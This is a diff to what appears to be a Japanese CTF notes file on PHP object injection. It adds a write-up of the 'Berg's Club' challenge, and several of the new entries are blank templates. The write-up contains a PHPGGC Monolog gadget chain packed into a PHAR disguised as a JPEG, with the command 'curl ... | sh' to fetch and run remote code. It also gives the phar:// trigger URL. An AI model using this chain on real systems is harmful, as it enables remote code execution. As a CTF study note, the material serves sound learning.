@@ -1114,7 +1114,51 @@ drwxr-xr-x   2 root root  4096 Sep 12 15:55 opt
 drwxr-xr-x   2 root root  4096 Sep 12 15:55 mnt
 drwxr-xr-x   2 root root  4096 Sep 12 15:55 srv
 ```
+## phar / file_exists (Berg's Club)
+https://balsn.tw/ctf_writeup/20181130-pwn2winctf/#berg%E2%80%99s-club  
+- **entrypoint**  
+JPEG画像をアップロードできるWebサイトがある。また、画像をシェアできる機能がある。  
+```txt
+http://200.136.252.42/share/uploads%2Fb7a41ed641bf590cec346e0bdede04a8.jpg
+```
+`/share/`以降でローカルファイルを指定しており、`http://200.136.252.42/share/%2fetc%2fpasswd`でエラーがでないので`file_exists`で読み込んでいると推測。`/etc`でも同様の結果となるため`file_exists`が使われていると推測するらしい。  
+JPEG画像じゃないとアップロードできないらしいので、PHARファイルをJPEGに偽装してアップロードして`/share/`から読み込む。  
+PHPGCCの`gadgetchains/Monolog/RCE/1/chain.php`をJPEG用に`setStub`でJPEG用のヘッダーをセットして偽装するように修正する。  
+```php
+<?php
+
+namespace GadgetChain\Monolog;
+
+class RCE1 extends \PHPGGC\GadgetChain\RCE
+{
+    public $version = '1.18 <= 1.23';
+    public $vector = '__destruct';
+    public $author = 'cf';
+
+    public function generate(array $parameters)
+    {   
+        $a = new \Monolog\Handler\SyslogUdpHandler(
+            new \Monolog\Handler\BufferHandler(
+                ['current', 'system'],
+                ['curl "240.240.240.240:1234" | sh', 'level' => null]
+            )
+        );
+        unlink('pwn.phar');
+        $p = new \Phar('pwn.phar', 0); 
+        $p['file.txt'] = 'test';
+        $p->setMetadata($a);
+        $p->setStub("\xff\xd8\xff\xe0\x0a<?php __HALT_COMPILER(); ?>");
+        return $a; 
+    }   
+}
+```
+これで`http://200.136.252.42/share/phar%3a%2f%2fIMAGE_PATH`でRCEできる！  
+- **payload**  
+```txt
+http://200.136.252.42/share/phar%3a%2f%2fIMAGE_PATH
+```
 ##
+https://srcincite.io/blog/2018/10/02/old-school-pwning-with-new-school-tricks-vanilla-forums-remote-code-execution.html  
 - **entrypoint**  
 - **payload**  
 ##
@@ -1123,6 +1167,15 @@ drwxr-xr-x   2 root root  4096 Sep 12 15:55 srv
 ##
 - **entrypoint**  
 - **payload**  
+
+##
+- **entrypoint**  
+- **payload**  
+
+##
+- **entrypoint**  
+- **payload**  
+
 
 # 参考
 https://securitycafe.ro/2015/01/05/understanding-php-object-injection/   
